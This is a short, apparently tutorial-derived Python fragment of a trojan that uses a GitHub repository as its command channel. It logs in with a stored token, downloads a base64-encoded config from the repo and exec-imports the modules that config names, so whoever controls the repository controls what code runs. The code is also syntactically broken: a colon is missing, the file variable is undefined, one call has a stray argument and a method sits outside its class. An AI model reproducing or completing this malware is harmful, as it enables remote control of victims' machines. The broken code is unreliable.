import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import datetime

def github_connect():
    with open('secret.txt') as file
    token = f.read().strip()
    user = 'Hackpark'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()



def get_config(self):
    config_json = get_file_contents('config'self, self.config_file, self.repo)

    config =json.loads(base64.b64decode(config_json))
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task["module"])

    
    return config

    